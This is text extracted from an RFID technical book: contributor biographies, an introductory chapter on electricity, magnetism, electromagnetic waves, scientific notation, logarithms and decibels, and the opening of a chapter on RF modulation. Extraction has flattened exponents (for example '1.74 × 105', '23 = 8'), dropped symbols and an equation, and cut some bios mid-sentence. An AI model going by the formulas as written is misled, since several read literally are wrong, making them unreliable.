Paul Sanghera, an expert in multiple ﬁ elds including computer networks 
and physics (the parent ﬁ elds of RFID), is a subject matter expert in RFID. 
With a Masters degree in Computer Science from Cornell University and 
a Ph.D. in Physics from Carleton University, he has authored and co-authored 
more than 100 technical papers published in well reputed European and 
American research journals. He has earned several industry certiﬁ cations 
including CompTIA Network+, CAPM, CompTIA Project+, CompTIA 
Linux+, Sun Certiﬁ ed Java Programmer, and Sun Certiﬁ ed Business 
Component Developer. Dr. Sanghera has contributed to building world-class 
technologies such as Netscape Communicator and Novell’s NDS. He 
has taught technology courses at various institutes including San Jose Sate 
University and Brooks College. As an engineering manager, he has been at 
the ground ﬂ oor of several startups. He is the author of several books on 
technology and project management published by publishers such as 
McGraw-Hill and Thomson Course Technology.
Frank Thornton runs his own technology consulting ﬁ rm, Blackthorn 
Systems, which specializes in wireless networks. His specialties include 
wireless network architecture, design, and implementation, as well as 
network troubleshooting and optimization. An interest in amateur radio 
helped him bridge the gap between computers and wireless networks. 
Having learned at a young age which end of the soldering iron was hot, 
he has even been known to repair hardware on occasion. In addition to 
his computer and wireless interests, Frank was a law enforcement ofﬁ cer 
for many years. As a detective and forensics expert he has investigated 
approximately one hundred homicides and thousands of other crime scenes. 
Combining both professional interests, he was a member of the workgroup 
that established ANSI Standard “ANSI/NIST-CSL 1-1993 Data Format 
for the Interchange of Fingerprint Information.” He co-authored WarDriving: 
Drive, Detect, and Defend: A Guide to Wireless Security (Syngress Publishing, 
ISBN: 1-93183-60-3), as well as contributed to IT Ethics Handbook: 
Right and Wrong for IT Professionals (Syngress, ISBN: 1-931836-14-0) and

trends in technology, including the development of the RFID market. 
She writes for a number of publications, and serves as the Editor for 
the award-winning RFID Weblog, named to the CNET Blog 100, and 
syndicated on MoreRFID.com. She is a part-time instructor at the 
University of Akron and is also the host of her own talk radio program/
podcast series on the VoiceAmerica.com Internet radio network.
Anita has held a variety of senior executive positions culminating in 
the role of CEO of an information technology subsidiary of Bell & Howell.

Advisory Board, Center for Information Technology and eBusiness at the 
University of Akron. Anita holds a B.A. from Duquesne University and 
a J.D. from the University of Akron Law School.
Brad ‘RenderMan’ Haines is one of the more visible and vocal members 
of the wardriving community, appearing in various media outlets and 
speaking at conferences several times a year. Render is usually near by on 
any wardriving and wireless security news, often causing it himself. His 
skills have been learned in the trenches working for various IT companies 
as well as his involvement through the years with the hacking community, 
sometimes to the attention of carious Canadian and American intelligence 
agencies. A ﬁ rm believer in the hacker ethos and promoting responsible 
hacking and sharing of ideas, he wrote the ‘Stumbler ethic’ for beginning 
wardrivers and greatly enjoys speaking at corporate conferences to dissuade 
the negative image of hackers and wardrivers.
His work frequently borders on the absurd as his approach is usually 
one of ignoring conventional logic and just doing it. He can be found in 
Edmonton, Alberta, Canada, probably taking something apart.
Anand Das has seventeen plus years of experience creating and implementing 
business enterprise architecture for the Department of Defense (DOD) 
and the commercial sector. He is founder and CTO of Commerce Events,

Previously he was Vice President with SAIC where he led the RFID 
practice across several industry verticals and completed global rollouts 
of RFID infrastructure across America, Asia, Europe and South Africa. 
He served as the corporate contact for VeriSign and played a key role in 
shaping the EPCglobal Network for federal and commercial corporations. 
Earlier, he was chief architect at BEA systems responsible for conceptualizing 
and building the Weblogic Integration suite of products. He has been a 
signiﬁ cant contributor to ebXML and RosettaNet standard committees 
and was the driving force behind the early adoption of service-oriented

Chapter 1 • Physics, Math, and RFID: Mind the Gap
Introduction
What do the U.S. Department of Defense, Wal-Mart, and you have in common? Radio 
frequency identiﬁ cation, or RFID! Whether you choose to know about it or not, RFID 
affects you and the world around you in a ubiquitous way. So, congratulations that you have 
chosen to learn about it.
The ﬁ rst thing to understand about RFID is that it is an application of physics to the 
extent that the core functioning of RFID technology is governed by the laws of physics. You 
don’t need to have a Ph.D. in physics to become a successful RFID professional, but an 
understanding of the physics of RFID will enable you to design, deploy, and operate RFID 
systems in an optimal way. In this chapter, we attempt to ease your way into physics as it 
relates to RFID by explaining some basic physics concepts. As they say, mathematics is the 
language of physics, or of any science for that matter. The good news is that you need only 
very simple math to understand RFID: powers of 10, logarithms, and some unit conversions. 
Before you dive into the book, we take a bird’s-eye view of RFID in this chapter. The goal 
is to provoke you to start asking questions about the details that will be addressed in the 
forthcoming chapters.
The overall goal of this chapter is to help you avoid falling into the gaps between physics, 
math, and RFID. We ﬁ ll those gaps by exploring three avenues: basic physics concepts, the 
math of RFID, and an overview of RFID.
Some Bare-Bones Physics Concepts
Just when you thought you got away with missing physics classes in high school, here comes 
a physics lecture for you! But fear not. It’s going to be very simple and concise.
As you already know, physics is a discipline in natural science. The word science has its 
origin in a Latin word that means to know. Science is the body of knowledge of the natural 
world, organized in a rational and veriﬁ able way. The word physics has its origin in the Greek 
word that means nature. Physics is that branch (or discipline) of science that deals with 
understanding the universe and its systems in terms of fundamental constituents of matter 
(such as atoms, electrons, and quarks) and the interactions among those constituents. Applied 
physics refers to the practical (such as technological) use of physics—for example, electronics, 
engineering, and RFID. In other words, applied physics involves utilizing basic physics 
principles to build practical devices and systems such as radios, televisions, cellular phones, 
or an RFID system.
To clear your way toward understanding the physics behind RFID, let’s look at some 
basic physics concepts:
■ 
Physical quantity A measurable observable is called a physical quantity. In 
physics, we understand the universe and the systems in the universe in terms 
of physical quantities and the relationships among them. In other words, laws 

 
Physics, Math, and RFID: Mind the Gap • Chapter 1

of physics are expressed in terms of relationships among the physical quantities. 
Length, time, speed, force, energy, and temperature are some examples of 
physical quantities.
■ 
Unit A physical quantity is measured in numbers of a basic amount called a unit. 
The measurement of a quantity contains a number and a unit—for example, in 
15 miles, mile is a unit of distance (or length).
■ 
Force This is the inﬂ uence that an object exerts on another object to cause some 
change.
■ 
Interaction This is a mutual force between two objects through which they 
affect each other. For example, two particles attract each other or repel each 
other. Sometimes the words interaction and force are used synonymously. There are 
four known basic interactions (or forces) that keep the universe functioning 
together:
■ Gravitational force
■ Electromagnetic force
■ Strong nuclear force
■ Weak nuclear force
Where there is a force, there is energy, or potential for energy.
■ 
Energy Energy is the measure of the ability of a force to do work. There are different 
kinds of energies corresponding to different forces, such as electromagnetic 
energy.
■ 
Power Power is the amount of work done or the energy trasnsferred per unit 
time.
■ 
Work Work is a measure of the amount of change produced by a force acting on 
an object. But how is it possible that two charged objects separated from each other 
can exert force on each other? This is where the concept of ﬁ eld comes into the 
picture.
■ 
Field The basic forces of nature work between two objects without the objects 
physically touching each other. For example, Sun and Earth attract each other 
through gravitation force without touching each other. This effect is called action at 
a distance and is explained in physics by the concept of a ﬁ eld. The two objects 
(which, for example, attract or repel each other from a distance) create a ﬁ eld in the 
space between them, and it is that ﬁ eld that exerts the force on the objects. For 
example, there is a gravitation ﬁ eld corresponding to gravitational force and an 
electromagnetic ﬁ eld corresponding to electromagnetic force.

■ 
Speed Speed, in general, means the rate of something. In physics, it means the 
rate of motion; for example, your car is moving at a speed of 70 miles per hour.
■ 
Hypothesis A hypothesis is a principle-like statement made as an explanation of 
a phenomenon and is generally based on previous observations, extensions of 
existing scientiﬁ c theories, or both. The scientiﬁ c method requires that a scientiﬁ c 
hypothesis must be veriﬁ able; that is, you must be able to test it. The word hypothesis 
has its roots in the Greek word that means to suppose.
■ 
Law A physics law (also called a physical law, a law of nature, or a scientiﬁ c law) is 
a set of generalized conclusions based on observations of physical behavior through 
repeated scientiﬁ c experiments, and these conclusions are generally accepted within 
the scientiﬁ c community. A hypothesis may turn into a law through repeated 
conﬁ rmation by scientiﬁ c experiments.
Of the four basic interactions in the universe, the interaction that is relevant to RFID is 
the electromagentic interaction, which exhibits itself in our world in many forms, including 
electricity and magnetism.
Understanding Electricity
Electricity is the property of matter related to electric charge. Historically, the word 
electricity has been used by several scientists to mean electric charge. This property 
(electricity) is responsible for several natural phenomena such as lightning and is used 
in several industrial applications such as electric power and the whole field of 
electronics.
To understand electricity, you must understand the related concepts discussed in the 
following:
Electric charge Electric charge, also referred to simply as charge, is a basic 
property of some fundamental particles of matter. There are two types of 
charge: positive and negative. For example, an electron has a negative charge, 
and a positron (an anti-particle of electron) has a positive charge. The standard 
symbol used to represent charge is q or Q. Two particles (or objects) with the 
same type of charge repel each other, and two objects with the opposite types 
of charge attract each other. The charge is measured in units of coulomb, 
denoted by C.
Electric potential/voltage The electric potential difference between two points 
is the work required to take one unit, C, of charge from one point to another. This 
is commonly called electric potential or voltage because it’s measured in units of volt, 
denoted by V.

Capacitance This is the amount of charge stored in a system, called a capacitor, 
per unit of electric potential. In other words, the capacitance, C, is deﬁ ned by the 
following equation:
C = Q/V
One example of a capacitor is the so-called parallel plates capacitor: two metallic 
plates separated from each other, with each plate carrying equal and opposite 
charge, Q, with a potential difference between them, V. Capacitance is measured in 
units of farad, denoted by F. For example, if the charge on each plate of a parallel 
plate capacitor is one C, and the voltage between them is one V, the capacitance of 
the capacitor will be one F.
Electric current This is the rate of ﬂ ow of electric charge per unit time and can 
be deﬁ ned by the following equation:
I = Q/t
In this equation, I is the current and Q is the amount of charge that ﬂ owed past a 
point in time t. Current is measured in units of ampere, denoted by A. For example, 
one C of charge ﬂ owing past a point in one second represents one A of current. 
The material such as metals that permit relatively free ﬂ ow of charge are called 
conductors, whereas the materials such as glass that do not allow free ﬂ ow of charge 
are called insulators.
Resistance This is a measure of opposition offered by a material to the flow 
of charge through it. The resistance can be measured by the following 
equation:
I = V/R
This means the larger the resistance, the smaller the current. Resistance is 
measured in units of ohm, denoted by 
. For example, if the voltage of one V 
creates one A of current in a conductor, then the resistance of the conductor 
is one 
.
Electric energy This is the amount of work that can be done by an amount of 
electric charge across a potential difference. For example, the energy, E, of a charge 
Q across a voltage V is given by the following equation:
E = QV
Electric power This is the rate of work performed by an electric current. In 
other words, it’s the electric energy produced or consumed per unit of time, and is 
given by the following equation:
P = E/t = QV/t = IV

Chapter 1 • Physics, Math, and RFID: Mind the Gap
The power is measured in units of watt (W). For example, the power consumed to 
maintain a current of one A across a voltage of one V is one W.
Electric ﬁ eld Electric ﬁ eld is a ﬁ eld that charges at a distance used to exert force 
on each other. In other words, the charges at a distance interact with each other 
through their ﬁ elds, called electric ﬁ elds.
Two charges of the same type exert repulsive force on each other, and two charges 
of opposite types exert attractive force on each other, and this force is called electric 
force. A charge in motion creates another kind of force, called magnetic force.
Understanding Magnetism
Magnetism is the property of material that enables two objects to exert a speciﬁ c kind of 
force on each other, called magnetic force, which is created by electric charge in motion. To 
understand magnetism, you must understand the related concepts discussed in the following:
Magnetic ﬁ eld A magnetic ﬁ eld is a ﬁ eld produced by a moving charge that it 
uses to exert magnetic force on another moving charge.

Show that electric power can also be expressed by the following equations:
 P = I2R
 P = V2/R
Solution: We know that:
P = IV
We also know that:
I = V/R
Therefore:
P = IV = (V/R)V = V2/R
But:
I = V/R means V = IR
Therefore:
P = IV = I × IR = I2R

Magnetic ﬂ ux This is a measure of the quantity of magnetic ﬁ eld through a 
certain area. It is proportional to the strength of the magnetic ﬁ eld and the surface 
area under consideration. For example, the current running through a wire in a 
circuit will create the magnetic ﬁ eld and hence the magnetic ﬂ ux in the area 
around it.
Faraday’s Law Faraday’s Law states that the change in magnetic ﬂ ux creates 
electromotive force, which is practically a voltage. In other words, the changing 
magnetic ﬂ ux through a circuit will induce a current in the circuit. Recall that the 
magnetic ﬂ ux can be created by the current in a circuit. Faraday’s Law says the 
reverse: The change in ﬂ ux can create current.
Inductive coupling Consider two electric circuits next to each other. There will 
be magnetic ﬂ ux through the second circuit due to the current in the ﬁ rst circuit. 
If you change the current in the ﬁ rst circuit, it will change the magnetic ﬂ ux 
through the second circuit, and the change in magnetic ﬂ ux will create the current 
through the second circuit due to Faraday’s Law. This effect, called inductive coupling, 
is used in RFID systems. You will see in this book that readers use inductive coupling 
to communicate with passive tags in an RFID system. You will be introduced to 
readers and tags later in this chapter.
Electricity and magnetism are related to each other and can be looked upon as two facets 
of what is called electromagnetism.
Understanding Electromagnetism
Electromagnetism is the uniﬁ ed framework through which to understand electricity, magnetism, 
and the relationship between them—in other words, to understand electric ﬁ elds and magnetic 
ﬁ elds and the relationship among them. To see the relationship, ﬁ rst recall that a charge creates 
an electric ﬁ eld and that when the same charge starts moving, it creates a magnetic ﬁ eld. 
The electric ﬁ eld exerts electric force, whereas a magnetic ﬁ eld exerts magnetic force; both 
originate from the electric charge. Therefore, they are intimately related: A changing electric 
ﬁ eld produces a magnetic ﬁ eld, and a changing magnetic ﬁ eld produces an electric ﬁ eld. 
Due to this intimacy, the electric force and magnetic force are considered two different man-
ifestations of the same uniﬁ ed force, called electromagnetic (EM) force. The uniﬁ ed form of the 
electric ﬁ eld and magnetic ﬁ eld is called an electromagnetic ﬁ eld, and the electric ﬁ eld and the 
magnetic ﬁ eld are considered its components. In other words, electromagnetic force is 
exerted by an electromagnetic ﬁ eld.
Where there is a force, there is energy. The energy corresponding to electromagnetic 
force is called electromagnetic energy or electromagnetic radiation. This energy is transferred from 
one point in space to another point through what are called electromagnetic waves.

Electromagnetic Waves
A wave is a disturbance of some sort that propagates through space and transfers some kind 
of energy from one point to another. For example, when you speak to a person face to face, 
the sound wave travels from your mouth to the ear of the listener. The “disturbance” here is 
the change of pressure in the air. As long as the wave is traveling through a point, the air 
pressure at that point does not stay constant over time. The disturbance in an electromagnetic 
ﬁ eld is the change of electric and magnetic ﬁ eld. The wave can be looked upon as propagation 
of this disturbance.
As shown in Figure 1.1, you can describe a wave in terms of some parameters such as 
amplitude, frequency, and wavelength.
■ 
Wavelength Denoted by the symbol , this is the distance between two 
consecutive crests or two consecutive troughs of a wave. The distance equal to 
wavelength makes one cycle of change.
■ 
Amplitude Amplitude is the maximum amount of disturbance during one wave 
cycle.
■ 
Frequency This is the number of cycles per unit of time a wave repeats. The 
frequency of an electromagnetic wave, f, propagating through free space (a vacuum), 
is calculated using the following equation:

c is the velocity of light in vacuum. The frequency is measured in units of 
Hertz. One cycle per second is one Hertz, denoted by Hz.
■ 
Phase This is the current position in the cycle of change in a wave.
So, what is the frequency of EM waves? EM waves cover a wide spectrum of frequencies, 
and the ranges of these frequencies constitute one way we deﬁ ne different types of EM waves.

Types of Electromagnetic Waves
Electromagnetic waves can be grouped according to the direction of disturbance in them 
and according to the range of their frequency. Recall that a wave transfers energy from one 
point to another point in space. That means there are two things going on: the disturbance 
that deﬁ nes a wave, and the propagation of wave. In this context the waves are grouped into 
the following two categories:
■ 
Longitudinal waves A wave is called a longitudinal wave when the disturbances 
in the wave are parallel to the direction of propagation of the wave. For example, 
sound waves are longitudinal waves because the change of pressure occurs parallel 
to the direction of wave propagation.
■ 
Transverse waves A wave is called a transverse wave when the disturbances in 
the wave are perpendicular (at right angles) to the direction of propagation of 
the wave.
Electromagnetic waves are transverse waves. That means the electric and magnetic ﬁ elds 
change (oscillate) in a plane that is perpendicular to the direction of propagation of the wave. 
Also note that electric and magnetic ﬁ elds in an EM wave are also perpendicular to each other.
NOTE
Electric ﬁ elds and magnetic ﬁ elds (E and B) in an EM wave are perpendicular 
to each other and are also perpendicular to the direction of propagation of 
the wave.
Because electric and magnetic ﬁ elds change in a plane (perpendicular to the direction 
of wave propagation), the direction of change still has some freedom. Different ways of 
using this freedom provide another criterion to classify electromagnetic waves into the 
following:
■ 
Linearly polarized waves If the electric ﬁ eld (and hence the magnetic ﬁ eld) 
changes in such a way that its direction remains parallel to a line in space as the 
wave travels, the wave is called linearly polarized.
■ 
Circularly polarized waves If the change in electric ﬁ eld occurs in a circle 
or in an ellipse, the wave is called circularly or elliptically polarized. Therefore, the 
polarization of a transverse wave determines the direction of disturbance 
(oscillation) in a plane perpendicular to the direction of wave propagation.

10 
Chapter 1 • Physics, Math, and RFID: Mind the Gap
CAUTION
Only transverse waves can be polarized, because in a longitudinal wave, the 
disturbance is always parallel to the direction of wave propagation.
As shown in Figure 1.2, the radio waves occupy a major part of the electromagnetic 
spectrum. As the name suggests, a radio frequency identiﬁ cation (RFID) system uses radio 
waves to communicate.
If the numbers in Figure 1.2 do not make sense to you and if you have forgotten all 
about scientiﬁ c notation, units of measurement, and logarithms, you will need to brush up 
on these math-related concepts to make your journey through this book smoother.
So, you can classify electromagnetic waves based on the direction of disturbance in them 
(polarization). The other criterion to classify EM waves is the frequency.
The Electromagnetic Spectrum
Have you ever seen electromagnetic waves with your naked eye? The answer, of course, is 
yes! Visible light is an example of electromagnetic waves. In addition to visible light, electro-
magnetic waves include radio waves, ultraviolet radiation, and X-rays (which of course are 
not visible to the naked eye). These different kinds of EM waves only differ in their frequency 
and therefore their wavelength. The whole frequency range of EM waves is called the 
electromagnetic spectrum, which is illustrated in Figure 1.2, along with the names associated 
with different frequency ranges within the spectrum.

The Mathematics of RFID
This section discusses some math-related concepts such as scientiﬁ c notation, units, and 
logarithm. Understanding these concepts will help you more ﬁ rmly grasp the concepts 
discussed throughout this book.
Scientiﬁ c Notation
To express numbers, scientists use a notation called scientiﬁ c notation. It simpliﬁ es handling 
very large and very small numbers. Using this notation, you express a number as a product 
of a number between 1 and 10 and a power of 10. For example, the number 174,000 is 
expressed in scientiﬁ c notation as:
1.74 × 105
To convert a number in scientiﬁ c notation to the ordinary notation, here is the rule: 
Count as many places as the power of 10 after the decimal point, replace any empty place 
with a 0, and remove the point. For example:
1.25 × 104 = 12500
104 = 1 × 104 = 10000
Some powers of 10 have a name called a preﬁ x. For example, 103 is called kilo, as in 
kilometer or kilogram. These powers of 10 in common use are shown in Table 1.1, along 
with the numbers they represent.

Chapter 1 • Physics, Math, and RFID: Mind the Gap
NOTE
The power of 10 is also called exponent. For example, in 103, the number 3 is 
an exponent. In general, a mathematical operation written as xn is called 
“x raised to the power n.” This is also called exponentiation, with x as a base 
and n as an exponent.
In general, ax is called an exponential function. It means multiply the base with itself as many 
times as the exponent. For example:
23 = 2 * 2 * 2 = 8
Remember the following two formulae for exponential functions. The ﬁ rst formula is:
ax * ay = ax y
For example:
22 * 23 = 25 = 2 * 2 * 2 * 2 * 2 = 32
The second formula is:
ax/ay = ax-y
For example:
25/23 = 22 = 2 * 2 = 4
In addition to exponentiation, there is another function relevant to this book: the 
logarithmic function.
Logarithms
Logarithm is the inverse of an exponential function:
y = ax => x = logay
The expression logay is read as log y to the base a. For example:
1000 = 103 => 3 = log10 1000
The base 10 is a default for the term log; that is, log (1000) means log of 1000 to the base 
10. After understanding the deﬁ nition of log, you need to remember three more formulae 
for the log function. The ﬁ rst formula is:
log xn = n * logx

 
Physics, Math, and RFID: Mind the Gap • Chapter 1 
13
For example:
log 1000 = log 103 = 3 * log 10
The second formula is:
log (x*y) = log x + log y 
For example:
log 1000 = log(10*100) = log 10 + log 100
The third formula is:
 log (x/y) = log x  log y
For example:
log 100 = log(10000/100) = log 10000 − log 100
An example of use of your knowledge of logarithm is the decibel unit.
Decibel
Decibel, denoted by the symbol db, is a measure of the ratio of two values of a physical 
quantity such as power or voltage expressed in terms of logarithm. To be precise, the ratio 
X1/X2 of a physical quantity X will be expressed in decibels as:
X (db) = 10 * log (X1/X2)
Conﬁ guring & Implementing…
How will the ratio of electric power be expressed in decibels in terms of the ratio of 
voltage?
Recall that:
P = V2/R
P (db) = 10 * log(P1/P2) = 10 log(V1
2/V2
2) = 10 log (V1/V2)2 = 2*10 log (V1/V2)
= 20 * log (V1/V2)
P(db) = 20 log (V1/V2)
Now, if you see a relationship like this, you know why there is a 20 in front of log 
rather than 10.

Equipped with these basic physics and math concepts, you are now ready to explore the 
RFID ﬁ eld. Let’s start by taking the bird’s-eye view of the RFID landscape.
An Overview of RFID: How It Works
The story of RFID starts with one word: identiﬁ cation. RFID is here to replace existing 
identiﬁ cation technologies such as the barcode, which is used to identify an item by assigning 
it a unique number. An example of the barcode is shown in Figure 1.3. No doubt you have 
seen such barcodes on various products ranging from water bottles to wine cartons and from 
books to cases that contain quantities of items.
Figure 1.3 An Example of a Barcode on a Book
According to a display in the Smithsonian Institution’s National Museum of American 
History, the ﬁ rst purchase of a product with a barcode was made on June 26, 1974, at a 
supermarket in Ohio. Today, almost everything that you buy from retailers has a barcode 
printed on it. These barcodes help manufacturers and retailers in the following ways:
■ 
Keep track of inventory
■ 
Provide information about the quantity of products being sold
■ 
Speed up the checkout process

16 
Chapter 1 • Physics, Math, and RFID: Mind the Gap
The barcode technology has the following limitations:
■ 
A barcode identiﬁ es a type of product, not an individual item in that type.
■ 
Tracking is not automatic. For example, to keep track of inventory, you must scan 
each barcode on every item of a product.
■ 
A barcode does not contain much information other than the product type 
code.
■ 
A barcode is a read-only technology; that is, you cannot change the information on 
the barcode or add new information to it.
So, the basic promise of barcodes is to provide identiﬁ cation of products at the class level. 
RFID is replacing those barcodes with a greater promise: automatic and global identiﬁ cation 
and tracking of objects (at the individual level), which could include almost anything: 
individual product items in retail stores, animals, trees—even people. Here is one of many 
possible scenarios relating how RFID works:
1. A label-like electronic device called a tag is attached to an object that needs to be 
identiﬁ ed and tracked. The tag contains the unique identiﬁ cation of the object and 
possibly more information about it.
2. Another electronic device called a reader is mounted at speciﬁ c localities.
3. When a tagged object passes near any reader, the reader communicates with the tag 
and gets the information that the tag has about the object.
4. The reader passes the information to a host computer, which is typically part of a 
network connected to the Internet.
5. The host computers from several localities send the information about tagged 
objects to a central location.
6. The information is integrated at the central location into database management 
systems and can be analyzed by enterprise applications.
This scenario is depicted in Figure 1.4. The readers and tags use EM waves in the radio 
wave frequency range to communicate with each other.
NOTE
A reader is also called an interrogator, and a tag is also called a transponder.

 
Physics, Math, and RFID: Mind the Gap • Chapter 1 
17
The advantages of RFID technology over barcode technology are as follows:
■ 
The identiﬁ cation and tracking offered by RFID is at individual item level as 
opposed to the type level.
■ 
A tag can contain more information about the object than just its ID.
■ 
Depending on the type of tag, you can change the information on it.
■ 
The objects can be tracked globally, automatically, and in real time, if needed.
In other words, an RFID tag attached to an object is an intelligent barcode that can 
communicate through readers to a global network system to inform it where the object is. 
RFID technology can support a wide spectrum of applications, from tracking cattle to 
tracking trillions of consumer products worldwide, thereby enabling manufacturers to know 
the location of each product during its life cycle, from the time it’s manufactured to the time 
it’s consumed and tossed in a recycle bin or a trash can. You can see that RFID is going to 
be more ubiquitous than barcode, and its applications are limited only by your imagination. 
Here is a list of some applications to get you started:

■

patients in a health care facility or a hospital, linking a patient with the right 
medicine and doctor or nurse, identifying unresponsive patients, and so on.
■ 
Livestock tracking This includes tracking animals in places such as farms and 
zoos and linking them to their proper locations.
■ 
Supply chain tracking This includes tracking items through the supply chain 
and managing inventory. The supply chain ﬁ eld is the key early adopter of RFID 
technology.
■ 
Tracking in manufacturing This includes tracking parts during the manufacturing 
process as well as tracking the assembled items.
■ 
Tracking in retail stores This includes tracking store trolleys and shelves, 
thereby facilitating automatic payment, checkouts, and inventory management.
■ 
Tracking in Warehouses This includes real-time inventory tracking and 
management in a warehouse or storeroom by tracking items inside, items coming 
in, and items going out.
■ 
Tracking you Yes, RFID will track any object, including people—for example, 
tracking people entering a certain area for security purposes, automatic contact 
management at events instead of sticking notes on bulletin boards, tracking babies 
in hospitals, tracking children at theme parks and festivals, and so on.
“Hold on—tracking me?” you say, and you’d be right about the privacy issues. But that’s 
a topic for another book.
So the two main players in a core RFID system are the reader and the tag. You can start 
asking questions about them, such as this one: From how far apart can a reader and a tag 
communicate with each other? In other words, how large is the read range? Well, it could be 
anywhere from a centimeter to a few meters, depending on several factors, including the tag 
type and the value of the radio frequency being used for communication, called operating 
frequency.
Next, what do we mean by tag types? The tags can be categorized by different criteria. 
One of those criteria is the power source from which tags will draw energy to operate and to 
communicate. The tags that have their own power source such as a battery are called active 
tags, whereas the tags that do not have their own power source are called passive tags. A passive 
tag cannot do anything until it receives a signal (radio wave) from a reader to wake it up. 
It uses part of the energy from the signal to operate and the rest to communicate back to the 
reader—that is, to send back a radio wave. Recall the concept of inductive coupling, discussed 

 
Physics, Math, and RFID: Mind the Gap • Chapter 1 
19
earlier in this chapter. This is what goes on between a reader and an inductive passive tag: The 
magnetic energy is transferred from the reader to the passive tag through inductive coupling 
to power it up. It’s as though the reader were saying, “Hello, Mr. Tag, time to wake up and tell 
me everything you know about this object.”
Just like the read range, the readers and tags come in various sizes and shapes. Figure 1.5 
shows a reader and a tag on the smaller end of the size spectrum. I know your next question: 
How do a reader and a tag really communicate with each other? That question goes to the 
physics behind RFID, which is discussed in the next chapter.
Figure 1.5 A Reader and a Tag: Skyetek’s M1-mini (Image courtesy of Skyetek)
For now, note that neither the physics behind RFID nor the RFID technology itself is 
new. But it’s only recently that greatness has been bestowed upon RFID by giant inﬂ uencers 
such as the U.S. Department of Defense and Wal-Mart in their mandates and in a ﬂ urry of 
industrial mandates that followed. Now, armed with these mandates, government legislations, 
and the resulting hyperbole, RFID has set its journey to change the world. The forthcoming 
chapters will help prepare you to make your contribution to this revolution.
NOTE
Talking about legislation, the U.S. State Department has legislated that all 
U.S. passports must contain an RFID chip (tag) by the end of 2006. The chip, 
in addition to holding the standard passport data—name, address, birth date, 
and nationality—will also be able to hold biometric information such as iris 
scans and digital ﬁ ngerprints. The European Union has its own RFID passport 
initiative under way.

At the heart of an RFID system are two kinds of communication device: readers

the object from the tag. Readers and tags use radio waves, a type of electromagnetic 
wave, to communicate with each other.

Summary
Our universe is governed by four natural forces: gravitation force, strong nuclear force, weak 
nuclear force, and electromagnetic force. Where there is a force, there is energy, which is the 
ability of the force to do work. The amount of work done can be expressed in terms of 
power, which is the amount of energy transfer per unit of time. Work is performed when a 
force acts on an object and causes a change. For example, the Sun makes the Earth revolve 
around it by exerting gravitational force on it. Similarly, charged objects separated from each 
other can exert electromagnetic force on each other. How does an object exert force on 
another object without touching it? That happens through the ﬁ eld that exists between the 
two objects due to the force.
Of the four basic forces in the universe, the force that is relevant to RFID is the 
electromagnetic force, which exhibits itself in terms of electromagnetic waves. Electro-
magnetic waves, like any other wave, are characterized by their frequency and wavelength. 
These waves cover a wide spectrum of frequencies, called electromagnetic spectrum. Waves 
corresponding to one of the ranges in this spectrum are called radio waves. The radio 
waves are used by an RFID system for communication.
At the heart of an RFID system are two kinds of communication devices: tags and 
readers. A tag (an alternative to the barcode) is placed on an object that needs to be identiﬁ ed 
and tracked. The readers mounted at various locations read the information about the object 
from the tag and report it to the host computer, which in turn can send this information to 
a central location over the Internet. This way, an object can be tracked globally and in real 
time in an automatic fashion.
After learning the basic physics concepts in this chapter, you are ready to explore the 
physics behind RFID in the next chapter.

Chapter 2 • The Physics of RFID
Introduction
The core functionality of an RFID system is the communication between a reader and a tag. 
The communication is carried out using RF waves, which are basically the EM waves with 
frequencies from the subspectrum of EM frequency spectrum called radio frequencies. The 
propagation of these waves is governed by the underlying physics principles. The goal of this 
chapter is to help you understand some physics concepts related to this communication. To 
accomplish this goal, we will explore three avenues: generation and propagation of the RF 
wave carrying the data signal from the source to the antenna, emission of the RF wave by 
the antenna into the free space, and propagation of the RF wave traveling through the space. 
Pay attention to the characteristics that affect the performance of an RFID system during 
this journey of the RF wave.
Understanding Radio Frequency 
Communication
Generally speaking, RFID is a means to identify an object using radio frequency 
transmission, which suggests that communication is involved in the identiﬁ cation process. 
The communication takes place between two devices: a reader that needs the information 
and a tag that has the information. Before we dive into the physics of communication, let’s 
get on the same page about some concepts that are at the heart of this communication.
Elements of Radio Frequency Communication
Radio frequency communication uses the EM waves with frequencies from a speciﬁ c part of 
the EM frequency spectrum. Therefore, the underlying physics behind RF communication is 
the same as for any communication that uses electromagnetic waves to carry information. 
The four major players that make this communication happen are the following:
■ 
Data signal This is the wave that actually contains the information that needs to 
be sent to the receiver.
■ 
Carrier signal This is the wave that carries the data signal.
■ 
Modulation This is the process that encodes the data signal into the carrier 
signal and creates the radio wave that is actually transmitted by the antenna to 
propagate.
■ 
Antenna This is a device used to transmit and receive signals such as radio waves.

 
The Physics of RFID • Chapter 2 
25
Here is how these four players work together to make the communication happen. 
First, understand that the information is communicated through changes (such as vibrations) 
in the carrier signal. The carrier signal itself is a constant signal unchanging in frequency 
and voltage—for example, a sine wave. It represents no information. As an analogy, I would 
not convey much information if I merely produced a constant sound out of my mouth, 
such as:
OOOOOOOOOOOOOOOOOOOOOOO
To convey some information, I would need to speak different sentences and different 
words in a sentence. In radio frequency communication, the information is encoded into the 
carrier signal using a technique called modulation, which means variation or change. You take 
the data signal that represent the information and impress it on a constant radio wave called 
a carrier. The data signal, as a result, varies (or modulates) the carrier wave. Once transmitted 
through an antenna, the two go together dancing over the air in the form of a modulated 
signal. The process of encoding the data signal into the carrier wave is called modulation. The 
transmitted modulated signal is received by the antenna on the receiving end and is 
demodulated to obtain the data signal. The process is depicted in Figure 2.1.
NOTE
In an RFID system, both the reader and the tag have their own antennas 
through which they communicate with each other. A tag is also called a 
transponder because it responds to the reader’s attempt to read it, and the 
reader is also called a transceiver because it receives information from the tag.

Chapter 2 • The Physics of RFID
That all sounds good. But note that the original data signal itself has information in it, 
which is represented by the changes inherent in the signal. So the question is: Why don’t we 
transmit the original data signal, or why do we need modulation in the ﬁ rst place?
Modulation: Don’t Leave Antenna Without It
There are several reasons for the use of modulation in communication. Discussing the 
following two will be sufﬁ cient for the scope of this book.
The Propagation Problem
A data signal generally comprises a whole range of different frequencies together. The 
problem with the low-frequency components of the signal is that few communication media 
will allow the propagation of low frequencies without distortion. Modulation presents the 
solution to this problem by copying these low-frequency components to high-frequency 
carrier waves.
The Transmission Problem
The low-frequency data signal will have a high wavelength and as a result will require very 
large antennas for transmission and reception. Here is the rule of thumb: To achieve a useful 
amount of radiation, the antenna length should be at least one quarter of the wavelength of 
the wave to be propagated. For example, consider a signal component with frequency of 
1 KHz. The wavelength for this wave will be:
= c /f = (3 × 108 m/s)/(103 1/s) = 300 km
Antenna length = /4 = 75 km
A 75-kilometer-high antenna (the tower of Babylon)? You get the point. Modulation 
solves this problem by sending the low-frequency signal inside a high-frequency carrier wave.
Frequency Bands in Modulation
